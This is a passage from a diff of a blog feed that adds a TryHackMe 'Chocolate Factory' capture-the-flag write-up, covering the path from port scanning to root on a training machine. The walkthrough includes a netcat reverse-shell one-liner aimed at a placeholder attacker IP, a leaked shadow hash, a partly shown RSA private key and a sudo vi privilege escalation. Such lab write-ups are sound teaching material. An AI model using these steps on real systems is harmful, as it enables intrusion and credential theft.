+SF:\x20_:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\'
+SF:\\__\\'\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\___\x2
+SF:0\\\r\n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__:
+SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n\
+SF:x20\x20\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;------------
+SF:-----`\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\x
+SF:20\x20\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
+SF:20\x20\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\|___
+SF:___________________;________________\|\r\n\r\nA\x20small\x20hint\x20fro
+SF:m\x20Mr\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20here
+SF:!\x20;\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\&quot;\x20&quot;);
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port125-TCP:V=7.80%I=7%D=1/19%Time=60073A7E%P=x86_64-pc-linux-gnu%r(NUL
+SF:L,20F,&quot;\&quot;Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x20\x20__
+SF:_\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.---------------\.\r\n\x2
+SF:0\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x20\x20____\x2
+SF:0___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20_:
+SF:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\'\\__\\
+SF:'\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\___\x20\\\r\
+SF:n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__:\x20\x
+SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n\x20\x2
+SF:0\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;-----------------`
+SF:\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\x20\x20
+SF:\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
+SF:\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\|_________
+SF:_____________;________________\|\r\n\r\nA\x20small\x20hint\x20from\x20M
+SF:r\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20here!\x20;
+SF:\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\&quot;\x20&quot;)%r(Gener
+SF:icLines,20F,&quot;\&quot;Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x20
+SF:\x20___\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.---------------\.\
+SF:r\n\x20\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x20\x20_
+SF:___\x20___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/
+SF:\x20_:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\'
+SF:\\__\\'\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\___\x2
+SF:0\\\r\n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__:
+SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n\
+SF:x20\x20\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;------------
+SF:-----`\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\x
+SF:20\x20\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
+SF:20\x20\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\|___
+SF:___________________;________________\|\r\n\r\nA\x20small\x20hint\x20fro
+SF:m\x20Mr\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20here
+SF:!\x20;\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\&quot;\x20&quot;);
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Tue Jan 19 20:05:59 2021 -- 1 IP address (1 host up) scanned in 305.45 seconds
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Lots of information to go through, what stood out though are most of the ports are displaying the same information which shows:&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;small hint from Mr.Wonka : Look somewhere else, its not here! ;)&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;However on port 113 I saw:&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;http://localhost/key_rev_key &amp;lt;- You will find the key here!!!&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Other key notes are FTP allows anonymous log in and web server is available on port 80.&lt;/p&gt;
+
+&lt;h3 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h3&gt;
+
+&lt;p&gt;I decided to take a look at port 113 first and see what this key was. I used wget to download the file from the server using the url http://10.10.224.249/key_rev_key. Its an ELF file.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $file key_rev_key 
+key_rev_key: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=8273c8c
+9735121c0a12747aee7ecac1aabaf1f0, not stripped
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I used strings and found:&lt;/p&gt;
+
+&lt;p&gt;Enter your name:&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;laksdhfas&lt;/p&gt;
+
+  &lt;p&gt;congratulations you have found the key:&lt;/p&gt;
+
+  &lt;p&gt;b’-VkgXhFf6sAEcAwrC6YR-SZbiuSb8{REDACTED}’&lt;/p&gt;
+
+  &lt;p&gt;Keep its safe&lt;/p&gt;
+
+  &lt;p&gt;Bad name!&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $strings key_rev_key
+/lib64/ld-linux-x86-64.so.2
+libc.so.6
+__isoc99_scanf
+puts
+__stack_chk_fail
+printf
+__cxa_finalize
+strcmp
+__libc_start_main
+GLIBC_2.7
+GLIBC_2.4
+GLIBC_2.2.5
+_ITM_deregisterTMCloneTable
+__gmon_start__
+_ITM_registerTMCloneTable
+5j
+%l
+%j
+%b
+%Z
+%R
+%J
+%b
+=9
+AWAVI
+AUATL
+[]A\A]A^A_
+Enter your name:
+laksdhfas
+ congratulations you have found the key:
+b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY='
+ Keep its safe
+Bad name!
+;*3$&quot;
+GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
+crtstuff.c
+deregister_tm_clones
+__do_global_dtors_aux
+completed.7698
+__do_global_dtors_aux_fini_array_entry
+frame_dummy
+__frame_dummy_init_array_entry
+license.c
+__FRAME_END__
+__init_array_end
+_DYNAMIC
+__init_array_start
+__GNU_EH_FRAME_HDR
+_GLOBAL_OFFSET_TABLE_
+__libc_csu_fini
+_ITM_deregisterTMCloneTable
+puts@@GLIBC_2.2.5
+_edata
+__stack_chk_fail@@GLIBC_2.4
+printf@@GLIBC_2.2.5
+__libc_start_main@@GLIBC_2.2.5
+__data_start
+strcmp@@GLIBC_2.2.5
+__gmon_start__
+__dso_handle
+_IO_stdin_used
+__libc_csu_init
+__bss_start
+main
+__isoc99_scanf@@GLIBC_2.7
+__TMC_END__
+_ITM_registerTMCloneTable
+__cxa_finalize@@GLIBC_2.2.5
+.symtab
+.strtab
+.shstrtab
+.interp
+.note.ABI-tag
+.note.gnu.build-id
+.gnu.hash
+.dynsym
+.dynstr
+.gnu.version
+.gnu.version_r
+.rela.dyn
+.rela.plt
+.init
+.plt.got
+.text
+.fini
+.rodata
+.eh_frame_hdr
+.eh_frame
+.init_array
+.fini_array
+.dynamic
+.data
+.bss
+.comment
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I tried to crack the key but no joy, the name was also odd, at this point I decided to enumerate the machine further. Next I looked at FTP, logging in as ‘anonymous’ as the username and password I can only find one file.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $ftp 10.10.224.249
+Connected to 10.10.224.249.
+220 (vsFTPd 3.0.3)
+Name (10.10.224.249:daz): anonymous
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&amp;gt; ls -lah
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+drwxr-xr-x    2 65534    65534        4096 Oct 01 12:11 .
+drwxr-xr-x    2 65534    65534        4096 Oct 01 12:11 ..
+-rw-rw-r--    1 1000     1000       208838 Sep 30 14:31 gum_room.jpg
+226 Directory send OK.
+ftp&amp;gt; get gum_room.jpg
+local: gum_room.jpg remote: gum_room.jpg
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for gum_room.jpg (208838 bytes).
+226 Transfer complete.
+208838 bytes received in 0.43 secs (478.6774 kB/s)
+ftp&amp;gt; exit
+221 Goodbye.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The image is of gum!&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/chocolatefactory/gum.png&quot; alt=&quot;gum&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The image doesn’t really help so I decided to check to see if anything was hidden, using steghide I was able to extract a .txt file.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $steghide --extract -sf gum_room.jpg
+Enter passphrase: 
+wrote extracted data to &quot;b64.txt&quot;.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;As the name imply its base64.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $cat b64.txt 
+ZGFlbW9uOio6MTgzODA6MDo5OTk5OTo3Ojo6CmJpbjoqOjE4MzgwOjA6OTk5OTk6Nzo6OgpzeXM6
+KjoxODM4MDowOjk5OTk5Ojc6OjoKc3luYzoqOjE4MzgwOjA6OTk5OTk6Nzo6OgpnYW1lczoqOjE4
+MzgwOjA6OTk5OTk6Nzo6OgptYW46KjoxODM4MDowOjk5OTk5Ojc6OjoKbHA6KjoxODM4MDowOjk5
+OTk5Ojc6OjoKbWFpbDoqOjE4MzgwOjA6OTk5OTk6Nzo6OgpuZXdzOio6MTgzODA6MDo5OTk5OTo3
+Ojo6CnV1Y3A6KjoxODM4MDowOjk5OTk5Ojc6OjoKcHJveHk6KjoxODM4MDowOjk5OTk5Ojc6OjoK
+d3d3LWRhdGE6KjoxODM4MDowOjk5OTk5Ojc6OjoKYmFja3VwOio6MTgzODA6MDo5OTk5OTo3Ojo6
+Cmxpc3Q6KjoxODM4MDowOjk5OTk5Ojc6OjoKaXJjOio6MTgzODA6MDo5OTk5OTo3Ojo6CmduYXRz
+Oio6MTgzODA6MDo5OTk5OTo3Ojo6Cm5vYm9keToqOjE4MzgwOjA6OTk5OTk6Nzo6OgpzeXN0ZW1k
+LXRpbWVzeW5jOio6MTgzODA6MDo5OTk5OTo3Ojo6CnN5c3RlbWQtbmV0d29yazoqOjE4MzgwOjA6
+OTk5OTk6Nzo6OgpzeXN0ZW1kLXJlc29sdmU6KjoxODM4MDowOjk5OTk5Ojc6OjoKX2FwdDoqOjE4
+MzgwOjA6OTk5OTk6Nzo6OgpteXNxbDohOjE4MzgyOjA6OTk5OTk6Nzo6Ogp0c3M6KjoxODM4Mjow
+Ojk5OTk5Ojc6OjoKc2hlbGxpbmFib3g6KjoxODM4MjowOjk5OTk5Ojc6OjoKc3Ryb25nc3dhbjoq
+OjE4MzgyOjA6OTk5OTk6Nzo6OgpudHA6KjoxODM4MjowOjk5OTk5Ojc6OjoKbWVzc2FnZWJ1czoq
+OjE4MzgyOjA6OTk5OTk6Nzo6OgphcnB3YXRjaDohOjE4MzgyOjA6OTk5OTk6Nzo6OgpEZWJpYW4t
+ZXhpbTohOjE4MzgyOjA6OTk5OTk6Nzo6Ogp1dWlkZDoqOjE4MzgyOjA6OTk5OTk6Nzo6OgpkZWJp
+YW4tdG9yOio6MTgzODI6MDo5OTk5OTo3Ojo6CnJlZHNvY2tzOiE6MTgzODI6MDo5OTk5OTo3Ojo6
+CmZyZWVyYWQ6KjoxODM4MjowOjk5OTk5Ojc6OjoKaW9kaW5lOio6MTgzODI6MDo5OTk5OTo3Ojo6
+ ******************************* {REDACTED } *******************************
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Decoding I get the output of a /etc/shadow.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $cat b64.txt | base64 -d
+daemon:*:18380:0:99999:7:::
+bin:*:18380:0:99999:7:::
+sys:*:18380:0:99999:7:::
+sync:*:18380:0:99999:7:::
+games:*:18380:0:99999:7:::
+man:*:18380:0:99999:7:::
+lp:*:18380:0:99999:7:::
+mail:*:18380:0:99999:7:::
+news:*:18380:0:99999:7:::
+uucp:*:18380:0:99999:7:::
+proxy:*:18380:0:99999:7:::
+www-data:*:18380:0:99999:7:::
+backup:*:18380:0:99999:7:::
+list:*:18380:0:99999:7:::
+irc:*:18380:0:99999:7:::
+gnats:*:18380:0:99999:7:::
+nobody:*:18380:0:99999:7:::
+systemd-timesync:*:18380:0:99999:7:::
+systemd-network:*:18380:0:99999:7:::
+systemd-resolve:*:18380:0:99999:7:::
+_apt:*:18380:0:99999:7:::
+mysql:!:18382:0:99999:7:::
+tss:*:18382:0:99999:7:::
+shellinabox:*:18382:0:99999:7:::
+strongswan:*:18382:0:99999:7:::
+ntp:*:18382:0:99999:7:::
+messagebus:*:18382:0:99999:7:::
+arpwatch:!:18382:0:99999:7:::
+Debian-exim:!:18382:0:99999:7:::
+uuidd:*:18382:0:99999:7:::
+debian-tor:*:18382:0:99999:7:::
+redsocks:!:18382:0:99999:7:::
+freerad:*:18382:0:99999:7:::
+iodine:*:18382:0:99999:7:::
+tcpdump:*:18382:0:99999:7:::
+miredo:*:18382:0:99999:7:::
+dnsmasq:*:18382:0:99999:7:::
+redis:*:18382:0:99999:7:::
+usbmux:*:18382:0:99999:7:::
+rtkit:*:18382:0:99999:7:::
+sshd:*:18382:0:99999:7:::
+postgres:*:18382:0:99999:7:::
+avahi:*:18382:0:99999:7:::
+stunnel4:!:18382:0:99999:7:::
+sslh:!:18382:0:99999:7:::
+nm-openvpn:*:18382:0:99999:7:::
+nm-openconnect:*:18382:0:99999:7:::
+pulse:*:18382:0:99999:7:::
+saned:*:18382:0:99999:7:::
+inetsim:*:18382:0:99999:7:::
+colord:*:18382:0:99999:7:::
+i2psvc:*:18382:0:99999:7:::
+dradis:*:18382:0:99999:7:::
+beef-xss:*:18382:0:99999:7:::
+geoclue:*:18382:0:99999:7:::
+lightdm:*:18382:0:99999:7:::
+king-phisher:*:18382:0:99999:7:::
+systemd-coredump:!!:18396::::::
+_rpc:*:18451:0:99999:7:::
+statd:*:18451:0:99999:7:::
+_gvm:*:18496:0:99999:7:::
+charlie:$6$CZJnCPeQWp9/jpNx$khGlFdICJnr8R3JC/jTR2r7DrbFLp8zq8469d3c0.zuKN4se61FObwWGxcHZqO2RJHkkL1jjPYeeGyIJWE82X/:18535:0:99999:7:::
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Using hashcat I manage to crack the password. However, I’m unable to log in via SSH. Maybe the password has been changed?&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $ssh charlie@10.10.224.249
+charlie@10.10.224.249's password: 
+Permission denied, please try again.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I moved on to port 80 and had a look at the webserver and got a login page.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/chocolatefactory/squirrel.png&quot; alt=&quot;squirrel&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I tried the username Charlie and the cracked password and got in.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/chocolatefactory/command.png&quot; alt=&quot;command&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;initial-access&quot;&gt;Initial Access&lt;/h3&gt;
+
+&lt;p&gt;On http://10.10.224.249/home.php I was able to execute any commands, there didnt appear to be any filters. So I started a netcat listener on my VM with the command ‘nc -nvlp 4444’ and used a simple nc revershell shell payload on the web page.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc {Attacker IP} 4444 &amp;gt;/tmp/f&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Straight away I got a shell.&lt;/p&gt;
+
+&lt;h3 id=&quot;priv-esc&quot;&gt;Priv Esc&lt;/h3&gt;
+
+&lt;p&gt;I’m on the box but as www-data, I wanted to become the Charlie user. In /home/charlie I found an RSA key. I copied the contents of teleport to my clipboard and pasted in to a file on my attacking VM.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;www-data@chocolate-factory:/home/charlie$ cat teleport
+cat teleport
+-----BEGIN RSA PRIVATE KEY-----
+MIIEowIBAAKCAQEA4adrPc3Uh98RYDrZ8CUBDgWLENUybF60lMk9YQOBDR+gpuRW
+1AzL12K35/Mi3Vwtp0NSwmlS7ha4y9sv2kPXv8lFOmLi1FV2hqlQPLw/unnEFwUb
+L4KBqBemIDefV5pxMmCqqguJXIkzklAIXNYhfxLr8cBS/HJoh/7qmLqrDoXNhwYj
+B3zgov7RUtk15Jv11D0Itsyr54pvYhCQgdoorU7l42EZJayIomHKon1jkofd1/oY
+fOBwgz6JOlNH1jFJoyIZg2OmEhnSjUltZ9mSzmQyv3M4AORQo3ZeLb+zbnSJycEE
+RaObPlb0dRy3KoN79lt+dh+jSg/dM/TYYe5L4wIDAQABAoIBAD2TzjQDYyfgu4Ej
+Di32Kx+Ea7qgMy5XebfQYquCpUjLhK+GSBt9knKoQb9OHgmCCgNG3+Klkzfdg3g9
+zAUn1kxDxFx2d6ex2rJMqdSpGkrsx5HwlsaUOoWATpkkFJt3TcSNlITquQVDe4tF
+w8JxvJpMs445CWxSXCwgaCxdZCiF33C0CtVw6zvOdF6MoOimVZf36UkXI2FmdZFl
+kR7MGsagAwRn1moCvQ7lNpYcqDDNf6jKnx5Sk83R5bVAAjV6ktZ9uEN8NItM/ppZ
+j4PM6/IIPw2jQ8WzUoi/JG7aXJnBE4bm53qo2B4oVu3PihZ7tKkLZq3Oclrrkbn2
+EY0ndcECgYEA/29MMD3FEYcMCy+KQfEU2h9manqQmRMDDaBHkajq20KvGvnT1U/T
+RcbPNBaQMoSj6YrVhvgy3xtEdEHHBJO5qnq8TsLaSovQZxDifaGTaLaWgswc0biF
+uAKE2uKcpVCTSewbJyNewwTljhV9mMyn/piAtRlGXkzeyZ9/muZdtesCgYEA4idA
+KuEj2FE7M+MM/+ZeiZvLjKSNbiYYUPuDcsoWYxQCp0q8HmtjyAQizKo6DlXIPCCQ
+RZSvmU1T3nk9MoTgDjkNO1xxbF2N7ihnBkHjOffod+zkNQbvzIDa4Q2owpeHZL19
+znQV98mrRaYDb5YsaEj0YoKfb8xhZJPyEb+v6+kCgYAZwE+vAVsvtCyrqARJN5PB
+ ************************* {REDACTED } *************************
+-----END RSA PRIVATE KEY-----
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;With the key, I used chmod to change the permissions (SSH will fail if this is not done) and was able to SSH in to the box as Charlie.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $chmod 600 charlie
+┌─[daz@parrot]─[~/Documents/TryHackMe/Chocolatefactory]
+└──╼ $ssh -i charlie charlie@10.10.224.249
+Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-115-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Tue Jan 19 21:20:23 UTC 2021
+
+  System load:  0.0               Processes:           1207
+  Usage of /:   43.8% of 8.79GB   Users logged in:     0
+  Memory usage: 49%               IP address for eth0: 10.10.224.249
+  Swap usage:   0%
+
+
+0 packages can be updated.
+0 updates are security updates.
+
+
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+Last login: Wed Oct  7 16:10:44 2020 from 10.0.2.5
+Could not chdir to home directory /home/charley: No such file or directory
+To run a command as administrator (user &quot;root&quot;), use &quot;sudo &amp;lt;command&amp;gt;&quot;.
+See &quot;man sudo_root&quot; for details.
+
+charlie@chocolate-factory:/$
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;user.txt flag submitted I looked at escalating to root. ‘sudo -l’ shows I can escalate to root using VI, using &lt;a href=&quot;https://gtfobins.github.io/gtfobins/vi/#sudo&quot;&gt;GTFOBins&lt;/a&gt; I manage to get root.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;charlie@chocolate-factory:/$ sudo -l
+Matching Defaults entries for charlie on chocolate-factory:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User charlie may run the following commands on chocolate-factory:
+    (ALL : !root) NOPASSWD: /usr/bin/vi
+charlie@chocolate-factory:/$ 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Just when I think I’ve finished I get one more hurdle. When trying to get the root flag I find root.py in its place. I run the script and its asking for a key? I tried ‘test’ just to see what the scipt would do and it responded with: ‘NameError: name ‘test’ is not defined’. When looking at the ELF file, that had a key - ‘VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY=’, I entered the key and got ‘SyntaxError: unexpected EOF while parsing’.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;root@chocolate-factory:/root# python root.py 
+Enter the key:  test
+Traceback (most recent call last):
+  File &quot;root.py&quot;, line 3, in &amp;lt;module&amp;gt;
+    key=input(&quot;Enter the key:  &quot;)
+  File &quot;&amp;lt;string&amp;gt;&quot;, line 1, in &amp;lt;module&amp;gt;
+NameError: name 'test' is not defined
+root@chocolate-factory:/root# python root.py 
+Enter the key:  -VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY=
+Traceback (most recent call last):
+  File &quot;root.py&quot;, line 3, in &amp;lt;module&amp;gt;
+    key=input(&quot;Enter the key:  &quot;)
+  File &quot;&amp;lt;string&amp;gt;&quot;, line 1
+    -VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY=
+                                               ^
+SyntaxError: unexpected EOF while parsing
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Looking at the python script, its a cryptography challenge, I need to enter the key so it can decrypt and provide the output of the variable ‘mess’ which will likley include the flag.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;root@chocolate-factory:/root# cat root.py
+from cryptography.fernet import Fernet
+import pyfiglet
+key=input(&quot;Enter the key:  &quot;)
+f=Fernet(key)
+encrypted_mess= 'gAAAAABfdb52eejIlEaE9ttPY8ckMMfHTIw5lamAWMy8yEdGPhnm9_H_yQikhR-bPy09-NVQn8lF_PDXyTo-T7CpmrFfoVRWzlm0OffAsUM7KIO_xbIQkQojwf_unpPAAKyJQDHNvQaJ'
+dcrypt_mess=f.decrypt(encrypted_mess)
+mess=dcrypt_mess.decode()
+display1=pyfiglet.figlet_format(&quot;You Are Now The Owner Of &quot;)
+display2=pyfiglet.figlet_format(&quot;Chocolate Factory &quot;)
+print(display1)
+print(display2)
+print(mess)
+root@chocolate-factory:/root# 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I decided the quickest way was to remove the input element of the script and just input the key, I copied the script and called it ‘root2.py’.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;root@chocolate-factory:/root# cat root2.py 
+from cryptography.fernet import Fernet
+import pyfiglet
+key=&quot;-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY=&quot;
+f=Fernet(key)
+encrypted_mess= 'gAAAAABfdb52eejIlEaE9ttPY8ckMMfHTIw5lamAWMy8yEdGPhnm9_H_yQikhR-bPy09-NVQn8lF_PDXyTo-T7CpmrFfoVRWzlm0OffAsUM7KIO_xbIQkQojwf_unpPAAKyJQDHNvQaJ'
+dcrypt_mess=f.decrypt(encrypted_mess)
+mess=dcrypt_mess.decode()
+display1=pyfiglet.figlet_format(&quot;You Are Now The Owner Of &quot;)
+display2=pyfiglet.figlet_format(&quot;Chocolate Factory &quot;)
+print(display1)
+print(display2)
+print(mess)
+root@chocolate-factory:/root# 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;That worked and I now have the root flag!&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;root@chocolate-factory:/root# python root2.py 
+__   __               _               _   _                 _____ _          
+\ \ / /__  _   _     / \   _ __ ___  | \ | | _____      __ |_   _| |__   ___ 
+ \ V / _ \| | | |   / _ \ | '__/ _ \ |  \| |/ _ \ \ /\ / /   | | | '_ \ / _ \
+  | | (_) | |_| |  / ___ \| | |  __/ | |\  | (_) \ V  V /    | | | | | |  __/
+  |_|\___/ \__,_| /_/   \_\_|  \___| |_| \_|\___/ \_/\_/     |_| |_| |_|\___|
+                                                                             
+  ___                              ___   __  
+ / _ \__      ___ __   ___ _ __   / _ \ / _| 
+| | | \ \ /\ / / '_ \ / _ \ '__| | | | | |_  
+| |_| |\ V  V /| | | |  __/ |    | |_| |  _| 
+ \___/  \_/\_/ |_| |_|\___|_|     \___/|_|   
+                                             
+
+  ____ _                     _       _       
+ / ___| |__   ___   ___ ___ | | __ _| |_ ___ 
+| |   | '_ \ / _ \ / __/ _ \| |/ _` | __/ _ \
+| |___| | | | (_) | (_| (_) | | (_| | ||  __/
+ \____|_| |_|\___/ \___\___/|_|\__,_|\__\___|
+                                             
+ _____          _                    
+|  ___|_ _  ___| |_ ___  _ __ _   _  
+| |_ / _` |/ __| __/ _ \| '__| | | | 
+|  _| (_| | (__| || (_) | |  | |_| | 
+|_|  \__,_|\___|\__\___/|_|   \__, | 
+                              |___/  
+
+flag{cec59161d338fef787{REDACTED}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Thanks for reading!&lt;/p&gt;</content>
+
+      
+      
+      
+      
+      
+
+      <author>
+          <name>Darryn</name>
+        
+        
+      </author>
+
+      
+
+      
+        <category term="tryhackme" />
+      
+        <category term="ctf" />
+      
+        <category term="easy" />
+      
+
+      
+        <summary type="html"></summary>
+      
+
+      
+      
+    </entry>
   
     <entry>
       <title type="html">Pickle Rick Write Up</title>
@@ -3687,447 +4578,6 @@ Date:   Mon Jul 20 20:46:28 2020 +0000
         <category term="tryhackme" />
       
         <category term="ctf" />
-      
-
-      
-        <summary type="html"></summary>
-      
-
-      
-      
-    </entry>
-  
-    <entry>
-      <title type="html">GamingServer Write Up</title>
-      <link href="https://darrynbrownfield.co.uk/gamingserver" rel="alternate" type="text/html" title="GamingServer Write Up" />
-      <published>2020-09-06T00:00:00+00:00</published>
-      <updated>2020-09-06T00:00:00+00:00</updated>
-      <id>https://darrynbrownfield.co.uk/gamingserver</id>
-      <content type="html" xml:base="https://darrynbrownfield.co.uk/gamingserver">&lt;p&gt;&lt;img src=&quot;/assets/images/gamingserver/gamingserver.png&quot; alt=&quot;GamingServer&quot; /&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;overview&quot;&gt;Overview&lt;/h3&gt;
-
-&lt;p&gt;GamingServer is an easy Boot2Root machine from &lt;a href=&quot;https://tryhackme.com&quot;&gt;TryHackMe&lt;/a&gt; with 2 flags available ‘user.txt’ and ‘root.txt’.&lt;/p&gt;
-
-&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
-
